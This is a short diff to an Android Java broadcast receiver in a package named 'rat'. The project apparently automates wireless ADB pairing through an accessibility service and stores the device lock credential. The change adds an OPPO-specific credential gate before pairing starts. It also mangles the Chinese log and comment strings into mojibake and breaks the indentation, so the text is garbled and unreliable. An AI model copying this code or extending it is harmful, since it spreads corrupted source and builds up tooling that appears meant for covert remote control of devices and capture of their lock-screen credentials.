@@ -9,6 +9,8 @@ import com.vendor.rat.adb.AdbConnectionManager;
 import com.vendor.rat.auto.engine.adb.WirelessPairEngine;
 import com.vendor.rat.service.MyAccessibilityService;
 import com.vendor.rat.utils.SecureSettingsWriter;
+import com.vendor.rat.credential.LockCredentialStore;
+import com.vendor.rat.utils.DeviceUtils;
 
 /**
  * Debug BroadcastReceiver — 通过 ADB 命令直接触发各种调试操作
@@ -63,14 +65,19 @@ public class DebugReceiver extends BroadcastReceiver {
         }
     }
 
-    private void handleStartPair(Context context) {
+  private void handleStartPair(Context context) {
         MyAccessibilityService svc = MyAccessibilityService.getInstance();
         if (svc == null) {
-            Log.e(TAG, "START_PAIR: 无障碍服务未运行!");
-            return;
+     Log.e(TAG, "START_PAIR: æ éç¢æå¡æªè¿è¡!");
+   return;
         }
 
-        // 强制重置配对进度标志 (跳过冷却)
+     if (DeviceUtils.isOppo() && !LockCredentialStore.isCurrentRunVerified()) {
+            Log.w(TAG, "START_PAIR: blocked by OPPO credential gate");
+        return;
+        }
+
+        // å¼ºå¶éç½®éå¯¹è¿åº¦æ å¿ (è·³è¿å·å´)
         Log.i(TAG, "START_PAIR: 强制触发配对流程...");
         boolean started = WirelessPairEngine.startPairing(context);
         Log.i(TAG, "START_PAIR: result=" + started);
